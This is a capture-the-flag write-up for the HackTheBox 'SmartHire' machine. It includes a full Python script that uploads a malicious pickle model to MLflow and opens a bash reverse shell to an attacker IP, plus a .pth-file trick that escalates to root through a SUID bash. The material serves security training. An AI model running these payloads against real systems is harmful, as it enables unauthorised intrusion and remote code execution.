# HackTheBox: SmartHire Write-up

## Enumeration

I started with a full Nmap scan against the target:

```bash
nmap -sSVC -A 10.129.245.215
```

The scan revealed two exposed services:

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http  nginx 1.18.0
```

The HTTP service redirected to:

```text
http://smarthire.htb/
```

I added the hostname to `/etc/hosts` and continued with virtual-host enumeration.

## Virtual Host Enumeration

I used `ffuf` with a DNS subdomain wordlist:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
-u http://smarthire.htb \
-H "Host: FUZZ.smarthire.htb" \
-fc 301,302,403
```

The scan discovered the following virtual host:

```text
models.smarthire.htb
```

The host returned HTTP `401 Unauthorized`, indicating that authentication was required.

## MLflow Access

Opening `models.smarthire.htb` presented an authentication prompt.

The credentials:

```text
admin:password
```

successfully authenticated to the MLflow instance.

The exposed MLflow service was running version `2.14.1`.

## Initial Foothold

To obtain code execution, I created a malicious MLflow model containing a Python pickle payload.

The payload used Python's `__reduce__` method to execute a reverse shell command when the model was loaded.

```python
import requests
import pickle
import os

MLFLOW = "http://models.smarthire.htb"

USER = "admin"
PASS = "password"

YOUR_IP = "10.10.15.88"
PORT = 4444

MODEL_NAME = "hack-3396c17efd62-model"


class RCE:
    def __reduce__(self):
        cmd = f"bash -c 'bash -i >& /dev/tcp/{YOUR_IP}/{PORT} 0>&1'"
        return (os.system, (cmd,))


session = requests.Session()
session.auth = (USER, PASS)

exp = session.post(
    f"{MLFLOW}/api/2.0/mlflow/experiments/create",
    json={"name": "evil-pickle-raw"}
)

exp_id = exp.json()["experiment_id"]
print("[+] Exp ID:", exp_id)

run = session.post(
    f"{MLFLOW}/api/2.0/mlflow/runs/create",
    json={"experiment_id": exp_id}
)

run_id = run.json()["run"]["info"]["run_id"]
print("[+] Run ID:", run_id)

mlmodel = f"""artifact_path: model
flavors:
  python_function:
    cloudpickle_version: 3.1.1
    loader_module: mlflow.pyfunc.model
    python_model: python_model.pkl
    python_version: 3.10.12
mlflow_version: 2.14.1
model_uuid: 22222222222222222222222222222222
run_id: {run_id}
"""

payload = pickle.dumps(RCE(), protocol=4)

artifacts = {
    "MLmodel": mlmodel.encode(),
    "python_model.pkl": payload,
}

for name, content in artifacts.items():
    url = (
        f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts/"
        f"{exp_id}/{run_id}/artifacts/model/{name}"
    )

    r = session.put(url, data=content)
    print(f"[+] Upload {name}: {r.status_code}")

source = f"mlflow-artifacts:/{exp_id}/{run_id}/artifacts/model"

version = session.post(
    f"{MLFLOW}/api/2.0/mlflow/model-versions/create",
    json={
        "name": MODEL_NAME,
        "source": source,
        "run_id": run_id
    }
)

print("[+] Register:", version.status_code)
print(version.text)
```

The script created a new MLflow experiment and run, uploaded the malicious model artifacts, and registered the model.

## Triggering the Payload

The application exposed a prediction endpoint on the main `smarthire.htb` virtual host.

I triggered model processing by submitting a CSV file to `/predict`:

```bash
curl -i -b ~/sh.cookies \
-X POST http://smarthire.htb/predict \
-F "file=@/home/neldi24/Desktop/resume.csv;type=text/csv"
```

Once the malicious model was loaded by the application, the pickle payload executed and a reverse shell was received.

The shell was running as:

```text
svcweb
```

## Privilege Escalation

Further enumeration showed that the application included an MLflow control utility under:

```text
/opt/tools/mlflow_ctl/
```

The development plugin directory was writable:

```text
/opt/tools/mlflow_ctl/plugins/dev/
```

I used Python's `.pth` import mechanism to place a payload inside the writable plugin directory:

```bash
cat > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth << 'EOF'
import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
EOF
```

When the MLflow control utility was executed with elevated privileges, Python processed the `.pth` file and executed the embedded command.

This created a SUID-enabled copy of Bash:

```bash
ls -la /tmp/rootbash
```

Result:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Executing the binary with the `-p` option preserved the effective root privileges:

```bash
/tmp/rootbash -p
```

This resulted in a root shell.

## Attack Path

```text
Nmap
  ↓
smarthire.htb
  ↓
Virtual-host enumeration
  ↓
models.smarthire.htb
  ↓
MLflow authentication
  ↓
Malicious pickle model
  ↓
Model registration
  ↓
/predict request
  ↓
Reverse shell as svcweb
  ↓
Writable MLflow dev plugin directory
  ↓
Python .pth execution
  ↓
SUID Bash
  ↓
Root shell
```

## Notes

The flag values have been intentionally removed from this public write-up.
